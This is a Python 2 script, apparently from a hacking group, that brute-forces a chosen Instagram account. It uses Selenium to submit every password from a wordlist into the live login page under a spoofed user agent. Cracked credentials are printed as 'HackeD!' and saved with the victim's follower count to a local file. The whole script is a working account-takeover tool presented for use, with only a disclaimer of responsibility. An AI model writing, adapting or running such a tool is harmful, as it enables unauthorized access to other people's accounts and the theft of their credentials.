#!/usr/bin/python2.7
# we don't Accept any responsibility for any illegal usage.
# you Are free To develop this code brother <3
# Copyright - MR.CRACKED
# Team = Mahiska Cyber Team

from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import sys, os, random, time, threading, re

try:
    import requests
except ImportError:
    print '---------------------------------------------------'
    print '[*] pip install requests'
    print '   [-] you need to install requests Module'
    sys.exit()
try:
    from colorama import Fore, Back, Style
    wd = "reserved"
    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE
    b = Fore.BLUE
    y = Fore.YELLOW
    m = Fore.MAGENTA
    res = Style.RESET_ALL

except ImportError:
    print '---------------------------------------------------'
    print '[*] pip install colorama'
    print '   [-] you need to install colorama Module'
    sys.exit()

class InstaGramBruteForcE():
    def __init__(self):
        self.profile = webdriver.FirefoxProfile()
        self.profile.set_preference("general.useragent.override",
                               "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36"
                               " (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36")
    def print_logo(self):
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37, 30, 33, 38, 39]

        x = """
                  ____           __      [+] MR.CRACKED [+]      __  ___        
                 /  _/___  _____/ /_____ __________ __________ _/  |/  /        
                 / // __ \/ ___/ __/ __ `/ ___/ __ `/ ___/ __ `/ /|_/ /         
               _/ // / / (__  ) /_/ /_/ / /  / /_/ / /  / /_/ / /  / /          
              /___/_/ /_/____/\__/\__,_/_/   \__, /_/   \__,_/_/  /_/           
                             ____           /____/     ______                   
https://github.com/icammaci / __ )_______  __/ /____  / ____/___  _____________ 
                           / __  / ___/ / / / __/ _ \/ /_  / __ \/ ___/ ___/ _ |
                          / /_/ / /  / /_/ / /_/  __/ __/ / /_/ / /  / /__/  __/
                         /_____/_/   \__,_/\__/\___/_/    \____/_/   \___/\___/ 
                                           [+] Coded By Mahiska Cyber Team [+]                                   
    """
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.01)

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def UserName_Checker(self, username):
        try:
            wd.get('https://instagram.com/' + username)
            assert ('Page Not Found' or 'no encontrada' not in wd.title)
        except AssertionError:
            self.cls()
            self.print_logo()
            print y + '---------------------------------------------------'
            print g + '    [' + y + '+' + g + ']' + r + ' Error: ' + y + '    [ ' + w + \
                  ' UserName Not Valid! Make sure This username is True! ' + y + ']'
            return 1
        except:
            self.cls()
            self.print_logo()
            print y + '---------------------------------------------------'
            print g + '    [' + y + '+' + g + ']' + r + ' Error: ' + y + '    [ ' + w + \
                  ' Something Is Worng! try Again' + y + ']'

    def __option(self):
        try:
            print y + '---------------------------------------------------'
            print r + '    [' + y + '+' + r + ']' + w + ' usage: ' + g + '    [ ' \
                  + w + ' Python script.py Username password.txt ' + g + ']'
        except:
            pass
    def FolloweR_GeT(self, username):
        try:
            sess = requests.session()
            url = 'https://www.instagram.com/' + username
            Req = sess.get(url, timeout=5)
            Followers = re.findall('<meta content="(.*) Followers,', Req.text)
            if len(Followers) <= 0:
                pass
            else:
                return str(Followers[0])
        except:
            pass

    def Go_Attack(self, user, password, TimeAttack):
        try:
            elem = wd.find_element_by_name('username')
            elem.clear()
            elem.send_keys(user)
            elem = wd.find_element_by_name('password')
            elem.clear()
            elem.send_keys(password)
            elem.send_keys(Keys.RETURN)
            sleep(TimeAttack)
            assert ('Login' in wd.title)
        except AssertionError:
            print r + '        [' + y + '+' + r + ']' + g + ' HackeD! --> ' + m + user + ':' + password
            follower = self.FolloweR_GeT(user)
            if len(follower) == 0:
                pass
            else:
                print r + '        [' + y + '+' + r + ']' + g + ' Followers! --> ' + m + str(follower)
                try:
                    with open('Hacked_account.txt', 'a') as pp:
                        pp.write('---------[instagram.com/localroot]---------\n\n\n')
                        pp.write('  [+] username    : ' + str(user) + '\n')
                        pp.write('  [+] password    : ' + str(password) + '\n')
                        pp.write('  [+] Followerers : ' + str(follower) + '\n\n\n')
                except:
                    pass
            wd.delete_all_cookies()
            return 1
        except:
            self.cls()
            self.print_logo()
            print y + '---------------------------------------------------'
            print g + '    [' + y + '+' + g + ']' + r + ' Error: ' + y + '    [ ' + w + \
                  ' ConnectionError! Maybe your internet Down, please Check your Connection! ' + y + ']'

    def Brute_(self, usernames, passwords, TimeAttack):
        if self.UserName_Checker(usernames) == 1:
            return
        wd.get("https://instagram.com/accounts/login/")
        sleep(TimeAttack * 7)
        print r + '    [' + y + '+' + r + ']' + g + ' Bruting: ' + w + usernames
        for password in passwords:
            if self.Go_Attack(usernames, password, TimeAttack) == 1:
                break
    def main(self):
        self.cls()
        self.print_logo()
        global wd
        TimeAttack = 2
        try:
            username = sys.argv[1]
            dictionary = sys.argv[2]
        except:
            self.cls()
            self.print_logo()
            self.__option()
            sys.exit()
        try:
            f = open(dictionary, 'r')
            passwords = []

            while True:
                line = f.readline()
                if not line:
                    break
                passwords.append(line.strip('\n'))
            f.close()
        except:
            self.cls()
            self.print_logo()
            print y + '---------------------------------------------------'
            print g + '    [' + y + '+' + g + ']' + r + ' Error: ' + y + '    [ ' + w + \
                  ' Password file Path NotFound! Try Again. ' + y + ']'
            sys.exit()
        wd = webdriver.Firefox(self.profile)
        wd.implicitly_wait(30)
        self.Brute_(username, passwords, TimeAttack)
        wd.close()


if __name__ == '__main__':
    Rock = InstaGramBruteForcE()
    Rock.main()
